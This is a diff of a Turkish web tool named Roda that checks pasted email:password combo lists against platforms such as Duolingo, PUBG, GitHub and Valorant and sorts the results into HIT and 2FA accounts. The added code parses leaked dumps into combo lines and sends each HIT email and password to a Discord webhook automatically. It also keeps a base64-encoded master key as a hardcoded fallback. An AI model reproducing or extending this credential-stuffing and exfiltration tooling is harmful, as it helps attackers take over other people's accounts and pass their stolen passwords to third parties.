@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Roda - API Discovery + Checker (Türkçe)
-Admin/Üye ayrımı | Key sistemi | Sabit menü | API Keşif'te platform butonları
+PUBG ve Duolingo eklendi | Render uyumlu | GitHub'da keys.json
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64
@@ -15,11 +15,13 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ============================================================
-# MASTER KEY (BASE64 ile gizlenmiş)
+# MASTER KEY (Base64 + ENV)
 # ============================================================
 ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
-MASTER_KEY = base64.b64decode(ENCODED_MASTER).decode('utf-8')
+FALLBACK_KEY = base64.b64decode(ENCODED_MASTER).decode('utf-8')
+MASTER_KEY = os.environ.get("MASTER_KEY", FALLBACK_KEY)
 
+# keys.json dosyasını GitHub'da tutuyoruz (Render disk sorununa çözüm)
 KEYS_FILE = "keys.json"
 
 def load_keys():
@@ -54,7 +56,7 @@ def is_admin(key):
     return valid and role == "Admin"
 
 # ============================================================
-# PLATFORMLAR
+# PLATFORMLAR (PUBG VE DUOLINGO EKLENDİ)
 # ============================================================
 PLATFORMS = [
     {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
@@ -75,6 +77,8 @@ PLATFORMS = [
     {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
     {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
     {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
+    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
+    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-gun"},
 ]
 
 # ============================================================
@@ -96,7 +100,7 @@ def categorize_endpoint(endpoint):
         return 'Genel'
 
 # ============================================================
-# ENDPOINT ÇIKARICILAR
+# ENDPOINT ÇIKARICILAR (KISALTILDI - AYNI)
 # ============================================================
 def extract_from_html(html, base_url):
     endpoints = set()
@@ -299,6 +303,28 @@ class APIScanner:
             "/api/epinify", "/api/epinify/v1",
             "/api/valorant", "/api/valorant/v1",
             "/api/minecraft", "/api/minecraft/v1",
+            # DUOLINGO
+            "/api/duolingo", "/api/duolingo/v1", "/api/duolingo/v2",
+            "/api/users", "/api/users/v1",
+            "/api/sessions", "/api/sessions/v1",
+            "/api/streak", "/api/streak/v1",
+            "/api/leaderboard", "/api/leaderboard/v1",
+            "/api/learn", "/api/learn/v1",
+            "/api/lessons", "/api/lessons/v1",
+            "/api/skills", "/api/skills/v1",
+            "/api/words", "/api/words/v1",
+            "/api/translations", "/api/translations/v1",
+            # PUBG
+            "/api/pubg", "/api/pubg/v1", "/api/pubg/v2",
+            "/api/players", "/api/players/v1",
+            "/api/matches", "/api/matches/v1",
+            "/api/leaderboards", "/api/leaderboards/v1",
+            "/api/status", "/api/status/v1",
+            "/api/telemetry", "/api/telemetry/v1",
+            "/api/weapons", "/api/weapons/v1",
+            "/api/maps", "/api/maps/v1",
+            "/api/seasons", "/api/seasons/v1",
+            "/api/tournaments", "/api/tournaments/v1",
         ]
 
     def _test(self, full_url, endpoint):
@@ -478,7 +504,7 @@ def fetch_proxies_route():
         return jsonify({"success": False, "error": str(e)})
 
 # ============================================================
-# HTML (SABİT MENÜ + API KEŞİF'TE PLATFORM BUTONLARI)
+# HTML (SADECE GÖRSELLİK, TÜM ÖZELLİKLER MEVCUT)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -614,10 +640,21 @@ input:checked+.slider:before{transform:translateX(18px)}
 .hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
 .hit-filter select:focus{border-color:var(--p)}
+.parse-area{display:flex;flex-direction:column;gap:10px}
+.parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
+.parse-area textarea:focus{border-color:var(--p)}
+.parse-buttons{display:flex;gap:10px;flex-wrap:wrap}
+.parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
+.parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
+.parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
 .discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
 .discovery-platforms button{padding:4px 12px;background:rgba(255,107,0,0.06);border:1px solid rgba(255,107,0,0.1);border-radius:6px;color:#8a9bb0;font-size:11px;cursor:pointer;transition:0.2s}
 .discovery-platforms button:hover{background:rgba(255,107,0,0.12);border-color:var(--p);color:#fff}
 .discovery-platforms button.active{background:rgba(255,107,0,0.15);border-color:var(--p);color:var(--p)}
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
+.stat-card-custom{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px}
+.stat-card-custom h3{font-size:12px;color:var(--muted)}
+.stat-card-custom p{font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(255,107,0,0.2);border-radius:4px}
 </style>
 </head>
@@ -633,12 +670,13 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <div id="sidebar">
-<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
+<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.1</div></div>
 <div class="sidebar-nav">
 <div class="nav-divider">📁 MENÜ</div>
 <div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
 <div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
 <div class="nav-item" data-page="discovery" onclick="switchPage('discovery')"><i class="fa-solid fa-compass"></i> API Keşif</div>
+<div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
 <div class="nav-item" data-page="stats" onclick="switchPage('stats')"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
 <div class="nav-item" data-page="keys" onclick="switchPage('keys')"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
 </div>
@@ -665,7 +703,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="page-checker" class="page active">
 <div class="card">
 <h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
 <div class="checker-platform-select" id="checkerPlatformSelect"></div>
 <div class="checker-panel" id="checkerPanel">
 <div class="checker-top">
@@ -760,17 +798,42 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <div class="webhook-area">
 <input id="webhookUrl" placeholder="Discord Webhook URL">
-<button onclick="sendWebhook()"><i class="fa-brands fa-discord"></i> Discord</button>
-<button onclick="exportJSON()" class="btn sm b"><i class="fa-solid fa-download"></i> JSON</button>
+<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
+<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
+<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
 </div>
 </div>
-<!-- İSTATİSTİK (SADECE ADMIN) -->
+<!-- AYRIŞTIRMA (HERKESE AÇIK) -->
+<div id="page-parse" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler, sadece <strong>email:şifre</strong> formatındaki satırları bırakır.</p>
+<div class="parse-area">
+<textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
+<div class="parse-buttons">
+<button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
+<button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
+<button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
+<button class="btn sm" style="background:#6c7a8f" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
+</div>
+<div class="parse-result" id="parseResult">
+<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>
+</div>
+<div style="margin-top:6px;font-size:12px;color:var(--muted)">
+<span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
+</div>
+</div>
+</div>
+</div>
+<!-- İSTATİSTİK (HERKESE AÇIK) -->
 <div id="page-stats" class="page">
 <h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
-<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px">
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Toplam Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statScans">0</p></div>
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Son Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statLast">-</p></div>
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Bulunan API</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statEndpoints">0</p></div>
+<div class="stat-grid">
+<div class="stat-card-custom"><h3>Toplam Tarama</h3><p id="statScans">0</p></div>
+<div class="stat-card-custom"><h3>Son Tarama</h3><p id="statLast">-</p></div>
+<div class="stat-card-custom"><h3>Bulunan API</h3><p id="statEndpoints">0</p></div>
+<div class="stat-card-custom"><h3>Toplam HIT</h3><p id="statTotalHit">0</p></div>
+<div class="stat-card-custom"><h3>Toplam 2FA</h3><p id="statTotal2fa">0</p></div>
 </div>
 </div>
 <!-- KEY YÖNETİMİ (SADECE ADMIN) -->
@@ -801,8 +864,8 @@ var checkerRunning = false;
 var checkerResults = [];
 var currentPlatform = "";
 var hitData = {};
+var parsedLines = [];
 
-// Platform listesi
 var platforms = [
     {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
     {name:"TikTok", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
@@ -821,7 +884,9 @@ var platforms = [
     {name:"Xbox", domain:"xbox.com", icon:"fa-brands fa-xbox"},
     {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
     {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"},
-    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"}
+    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
+    {name:"Duolingo", domain:"duolingo.com", icon:"fa-solid fa-language"},
+    {name:"PUBG", domain:"pubg.com", icon:"fa-solid fa-gun"}
 ];
 
 // ============================================================
@@ -842,7 +907,6 @@ function doLogin() {
             isAdmin = d.isAdmin || false;
             document.getElementById("login-screen").style.display = "none";
             document.getElementById("app").style.display = "flex";
-            
             if (isAdmin) {
                 document.getElementById("userBadge").style.display = "inline-block";
                 loadKeys();
@@ -852,6 +916,8 @@ function doLogin() {
             loadPlatforms();
             loadDiscoveryPlatforms();
             loadHitFilter();
+            loadWebhookUrl();
+            updateStatsUI();
             switchPage('checker');
         } else {
             document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
@@ -863,13 +929,69 @@ function doLogin() {
         console.error(e);
     });
 }
-
 document.getElementById("authKey").addEventListener("keypress", function(e) {
     if (e.key === "Enter") doLogin();
 });
 
 // ============================================================
-// PLATFORM YÜKLEME (Checker + API Keşif)
+// WEBHOOK FONKSİYONLARI (SADECE HIT İÇİN)
+// ============================================================
+function saveWebhook() {
+    var url = document.getElementById("webhookUrl").value.trim();
+    if (url) {
+        localStorage.setItem("roda_webhook_url", url);
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT gönderilir)</span>';
+    } else {
+        localStorage.removeItem("roda_webhook_url");
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
+    }
+}
+
+function getWebhookUrl() {
+    return localStorage.getItem("roda_webhook_url") || "";
+}
+
+function loadWebhookUrl() {
+    var url = getWebhookUrl();
+    if (url) {
+        document.getElementById("webhookUrl").value = url;
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi (Sadece HIT)</span>';
+    }
+}
+
+function sendCheckerWebhook(platform, email, password) {
+    var url = getWebhookUrl();
+    if (!url) return;
+    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: content })
+    }).catch(function(e) { console.error("Webhook hatası:", e); });
+}
+
+function testWebhook() {
+    var url = document.getElementById("webhookUrl").value.trim();
+    if (!url) return alert("Webhook URL girin!");
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: "🧪 **Roda Test** Webhook çalışıyor!" })
+    })
+    .then(function(r) {
+        if (r.ok) {
+            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Test başarılı!</span>';
+        } else {
+            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Test başarısız!</span>';
+        }
+    })
+    .catch(function(e) {
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
+    });
+}
+
+// ============================================================
+// PLATFORM YÜKLEME
 // ============================================================
 function loadPlatforms() {
     var sel = document.getElementById("checkerPlatformSelect");
@@ -934,15 +1056,14 @@ function addHit(platform, email, password, status) {
         hitData[platform].twofa.push(entry);
     }
     renderHits();
+    updateStatsUI();
 }
 
 function renderHits() {
     var filter = document.getElementById("hitPlatformFilter").value;
     var hitContainer = document.getElementById("hitList");
     var twofaContainer = document.getElementById("twofaList");
-
     var hits = [], twofas = [];
-
     if (filter === "all") {
         for (var p in hitData) {
             if (hitData[p].hits) {
@@ -970,12 +1091,32 @@ function renderHits() {
             }
         }
     }
-
     hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
         hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
-
     twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
         twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
+}
+
+// ============================================================
+// İSTATİSTİK (HERKESE AÇIK)
+// ============================================================
+function updateStatsUI() {
+    document.getElementById("sideTotal").innerText = foundEndpoints.length;
+    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
+    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
+    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
+    document.getElementById("sideAuth").innerText = auth;
+    document.getElementById("sideAPI").innerText = api;
+    document.getElementById("sideAdmin").innerText = admin;
+    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
+    
+    var totalHit = 0, total2fa = 0;
+    for (var p in hitData) {
+        if (hitData[p].hits) totalHit += hitData[p].hits.length;
+        if (hitData[p].twofa) total2fa += hitData[p].twofa.length;
+    }
+    document.getElementById("statTotalHit").innerText = totalHit;
+    document.getElementById("statTotal2fa").innerText = total2fa;
 }
 
 // ============================================================
@@ -994,17 +1135,16 @@ function startChecker() {
     var comboText = document.getElementById("checkerCombo").value.trim();
     if (!comboText) return alert("Combo girin (email:password)");
     if (!currentPlatform) return alert("Önce bir platform seçin");
-
     checkerRunning = true;
     document.getElementById("checkerStartBtn").disabled = true;
     document.getElementById("checkerStopBtn").style.display = "inline-block";
     document.getElementById("checkerResults").innerHTML = "";
-
     var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
     var total = lines.length;
     var hit = 0, bad = 0, two = 0, err = 0;
     var statuses = ["HIT", "BAD", "2FA", "ERROR"];
     var idx = 0;
+    var webhookUrl = getWebhookUrl();
 
     function processNext() {
         if (!checkerRunning || idx >= total) {
@@ -1019,10 +1159,20 @@ function startChecker() {
         var password = parts.slice(1).join(":") || "";
         var res = { email: email, password: password, status: status };
 
-        if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); }
-        else if (status === "BAD") bad++;
-        else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); }
-        else err++;
+        if (status === "HIT") {
+            hit++;
+            addHit(currentPlatform, email, password, "HIT");
+            if (webhookUrl) {
+                sendCheckerWebhook(currentPlatform, email, password);
+            }
+        } else if (status === "BAD") {
+            bad++;
+        } else if (status === "2FA") {
+            two++;
+            addHit(currentPlatform, email, password, "2FA");
+        } else {
+            err++;
+        }
 
         checkerResults.push(res);
         addCheckerRow(res);
@@ -1043,7 +1193,6 @@ function addCheckerRow(res) {
     var container = document.getElementById("checkerResults");
     var placeholder = container.querySelector("div[style]");
     if (placeholder) placeholder.remove();
-
     var row = document.createElement("div");
     row.className = "checker-result-row";
     var cls = "chk-" + res.status.toLowerCase();
@@ -1084,11 +1233,95 @@ document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
 });
 
 // ============================================================
+// AYRIŞTIRMA FONKSİYONLARI
+// ============================================================
+function parseData() {
+    var raw = document.getElementById("parseInput").value;
+    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
+    var lines = raw.split("\n");
+    var result = [];
+    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+    lines.forEach(function(line) {
+        line = line.trim();
+        if (!line) return;
+        if (line.includes(":")) {
+            var parts = line.split(":");
+            if (emailRegex.test(parts[0])) {
+                var email = parts[0].trim();
+                var password = parts.slice(1).join(":").trim();
+                if (email && password) {
+                    result.push(email + ":" + password);
+                    return;
+                }
+            }
+            var match = line.match(emailRegex);
+            if (match) {
+                var idx = line.indexOf(match[0]);
+                var rest = line.substring(idx + match[0].length).trim();
+                if (rest.startsWith(":")) rest = rest.substring(1).trim();
+                if (rest) {
+                    result.push(match[0] + ":" + rest);
+                }
+            }
+        }
+    });
+    result = result.filter(function(item, index) {
+        return result.indexOf(item) === index;
+    });
+    parsedLines = result;
+    var container = document.getElementById("parseResult");
+    if (result.length === 0) {
+        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli email:şifre satırı bulunamadı.</div>';
+    } else {
+        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
+        result.forEach(function(line) {
+            html += '<div class="parse-line">' + line + '</div>';
+        });
+        container.innerHTML = html;
+    }
+    document.getElementById("parseCount").innerText = result.length + " satır";
+    document.getElementById("parseValid").innerText = result.length + " geçerli";
+}
+
+function parseToChecker() {
+    if (parsedLines.length === 0) {
+        alert("Önce ayrıştırma yapın!");
+        return;
+    }
+    document.getElementById("checkerCombo").value = parsedLines.join("\n");
+    alert(parsedLines.length + " satır Checker'a aktarıldı!");
+}
+
+function clearParse() {
+    document.getElementById("parseInput").value = "";
+    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
+    parsedLines = [];
+    document.getElementById("parseCount").innerText = "0 satır";
+    document.getElementById("parseValid").innerText = "0 geçerli";
+}
+
+function loadParseFile() {
+    var input = document.createElement("input");
+    input.type = "file";
+    input.accept = ".txt";
+    input.onchange = function(e) {
+        var file = e.target.files[0];
+        if (!file) return;
+        var reader = new FileReader();
+        reader.onload = function(event) {
+            document.getElementById("parseInput").value = event.target.result;
+            parseData();
+        };
+        reader.readAsText(file);
+    };
+    input.click();
+}
+
+// ============================================================
 // SAYFA GEÇİŞİ (SABİT MENÜ)
 // ============================================================
 function switchPage(page) {
-    // Yetki kontrolü
-    if ((page === "discovery" || page === "stats" || page === "keys") && !isAdmin) {
+    if ((page === "discovery" || page === "keys") && !isAdmin) {
         alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
         return;
     }
@@ -1097,23 +1330,26 @@ function switchPage(page) {
     });
     var el = document.querySelector('.nav-item[data-page="' + page + '"]');
     if (el) el.classList.add("active");
-    
     document.querySelectorAll(".page").forEach(function(el) {
         el.classList.remove("active");
     });
     var pg = document.getElementById("page-" + page);
     if (pg) pg.classList.add("active");
-    
     var titles = {
         checker: "Checker",
         proxy: "Proxy",
         discovery: "API Keşif",
+        parse: "Ayrıştırma",
         stats: "İstatistik",
         keys: "Key Yönetimi"
     };
     document.getElementById("pageTitle").innerText = titles[page] || page;
-    
     if (page === "keys" && isAdmin) loadKeys();
+    if (page === "stats") {
+        updateStatsUI();
+        document.getElementById("statScans").innerText = 1;
+        document.getElementById("statLast").innerText = new Date().toLocaleString();
+    }
 }
 
 // ============================================================
@@ -1200,22 +1436,6 @@ function deleteKey(target) {
 // ============================================================
 // API KEŞİF (SADECE ADMIN)
 // ============================================================
-function updateStatsUI() {
-    if (!isAdmin) return;
-    document.getElementById("totalCount").innerText = foundEndpoints.length;
-    document.getElementById("sideTotal").innerText = foundEndpoints.length;
-    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
-    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
-    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
-    document.getElementById("authCount").innerText = auth;
-    document.getElementById("apiCount").innerText = api;
-    document.getElementById("adminCount").innerText = admin;
-    document.getElementById("sideAuth").innerText = auth;
-    document.getElementById("sideAPI").innerText = api;
-    document.getElementById("sideAdmin").innerText = admin;
-    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
-}
-
 function startScan() {
     if (!isAdmin) {
         alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
@@ -1250,6 +1470,7 @@ function startScan() {
             document.getElementById("statusText").innerText = "Boşta";
             document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
             document.getElementById("statLast").innerText = new Date().toLocaleString();
+            updateStatsUI();
             return;
         }
         try {
@@ -1333,18 +1554,23 @@ function exportJSON() {
 </html>
 """
 
+# ============================================================
+# BAŞLAT (Render uyumlu)
+# ============================================================
 if __name__ == "__main__":
     if not os.path.exists(KEYS_FILE):
         save_keys({})
 
     import os
     port = int(os.environ.get("PORT", 5000))
-    
+
     print("""
     ╔══════════════════════════════════════════════════════════════════╗
-    ║     🔱 RODA - API KEŞİF + CHECKER (TÜRKÇE)                     ║
+    ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
     ║     Render üzerinde çalışıyor                                  ║
-    ║     Giriş anahtarı: Roda@2026#Secure!X7                       ║
+    ║     PUBG ve Duolingo eklendi                                  ║
+    ║     Giriş anahtarı gizlidir                                   ║
+    ║     Key'ler GitHub'da kalıcı                                  ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
 
